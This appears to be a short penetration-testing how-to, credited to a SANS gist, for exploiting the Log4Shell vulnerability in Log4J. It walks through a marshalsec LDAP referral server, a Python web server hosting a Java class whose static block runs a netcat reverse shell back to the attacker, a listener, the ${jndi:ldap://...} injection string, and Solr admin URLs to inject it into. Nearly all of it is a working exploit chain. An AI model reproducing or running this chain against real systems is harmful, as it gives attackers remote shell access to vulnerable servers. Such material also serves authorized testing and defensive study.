# Setting up a Callback Server

First - thank you to SANS who I stole this from.  https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4

From a kali box:

```
cd marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{kali_box_ip}:8080/#Log4JCallback"
```

From that kali box in a separate terminal:

```
python -m http.server 8080
```

Separately, on that kali box, in the same directory your webserver is now running in, drop this code into Log4JCallback.java:

```
public class Log4JCallback {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc {kali_box_ip} 8081 -e /bin/bash");
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}
```

Now compile that with `javac Log4JCallback.java`, and setup a netcat listener as mentioned in your code:

```
nc -v -l -p 8081
```

Now you've got three listeners setup.  Next you're going to send the message to the vulnerable server - the format is: `${jndi:ldap://{kali_box_ip}:1389/Log4JCallback}`.  The vulnerable server is going to log that jndi string, and Log4J is going to parse it and visit the ldap server on your Kali box at port 1389.  There it will find the marshalsec LDAP server, which will tell it to look for a Java class at a remote location, specifically your Kali box on port 8080.  The class will be requested from your Python webserver on port 8080, and will get executed on load.  That will run the "exec nc" code, calling back with a shell to your listener on port 8081.  You'll see the connections come in - with the last on your netcat port 8081 listener, and that last will be your remote shell.

# Vulnerable Services

## Solr

http://{solr-addr}:8983/solr/admin/cores?anything=${jndi...}
http://{solr-addr}:8983/solr/admin/configs?anything=${jndi...}
http://{solr-addr}:8983/solr/admin/collections?anything=${jndi...}
